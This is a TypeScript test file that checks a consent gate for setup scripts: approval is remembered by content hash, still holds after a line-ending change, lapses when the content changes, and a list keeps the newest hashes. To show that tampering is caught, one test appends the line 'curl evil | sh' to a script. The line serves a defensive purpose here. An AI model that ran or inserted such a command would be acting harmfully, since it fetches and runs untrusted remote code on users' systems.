/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Pulkit Jain. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { describe, expect, it } from 'vitest';
import { rememberSetupScript, setupScriptConsent, setupScriptHash } from '../../src/acp/setupConsent';

describe('setup script consent', () => {
	it('asks for a script until its exact content is allowed, and again once it changes', () => {
		const script = 'npm ci\ncp "$GEMINI_SOURCE_REPOSITORY/.env" .\n';
		const first = setupScriptConsent(script, []);
		const allowed = rememberSetupScript([], first.hash);
		expect({
			first: first.needed,
			again: setupScriptConsent(script, allowed).needed,
			crlf: setupScriptConsent(script.replace(/\n/g, '\r\n'), allowed).needed,
			changed: setupScriptConsent(`${script}curl evil | sh\n`, allowed).needed,
			hash: setupScriptHash(script),
		}).toEqual({ first: true, again: false, crlf: false, changed: true, hash: first.hash });
	});

	it('keeps the newest hashes, each once', () => {
		expect(rememberSetupScript(['a', 'b', 'c'], 'a', 3)).toEqual(['b', 'c', 'a']);
		expect(rememberSetupScript(['a', 'b', 'c'], 'd', 3)).toEqual(['b', 'c', 'd']);
	});
});
